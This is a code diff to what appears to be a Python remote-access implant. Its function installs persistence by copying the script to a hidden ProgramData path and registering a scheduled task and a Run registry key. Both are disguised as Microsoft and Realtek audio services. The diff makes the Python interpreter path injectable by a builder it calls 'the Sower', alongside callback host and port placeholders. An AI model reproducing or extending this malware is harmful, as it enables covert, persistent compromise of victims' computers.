@@ -16,6 +16,7 @@ import json
 # --- DYNAMIC CONFIG ---
 RHOST = "##RHOST##"
 RPORT = ##RPORT##
+PYTHON_PATH = "##PYTHON_PATH##"  # This will be replaced by the Sower
 # --------------------
 
 FILE_PORT = RPORT + 1
@@ -39,6 +40,9 @@ def install_admin_persistence():
         TASK_NAME = "MicrosoftWindowsAudioDeviceHighDefinitionService"
         PERSISTENT_NAME = "audiodg.pyw"
         PERSISTENT_PATH = os.path.join(PROGRAMDATA_PATH, "Microsoft", "Windows", "AudioService", PERSISTENT_NAME)
+
+        # Use the injected Python path for commands
+        PYTHON_EXECUTABLE = PYTHON_PATH if "##PYTHON_PATH##" not in PYTHON_PATH else "pythonw.exe"
 
         # Copy ourselves to the protected location
         current_path = os.path.abspath(sys.argv[0])
@@ -89,7 +93,7 @@ def install_admin_persistence():
   </Settings>
   <Actions Context="Author">
     <Exec>
-      <Command>pythonw.exe</Command>
+      <Command>{PYTHON_EXECUTABLE}</Command>
       <Arguments>"{PERSISTENT_PATH}"</Arguments>
     </Exec>
   </Actions>
@@ -115,7 +119,7 @@ def install_admin_persistence():
             0,
             winreg.KEY_WRITE | winreg.KEY_WOW64_64KEY
         )
-        command = f'pythonw.exe "{PERSISTENT_PATH}"'
+        command = f'"{PYTHON_EXECUTABLE}" "{PERSISTENT_PATH}"'
         winreg.SetValueEx(registry_key, 'Realtek HD Audio Universal Service', 0, winreg.REG_SZ, command)
         winreg.CloseKey(registry_key)
 
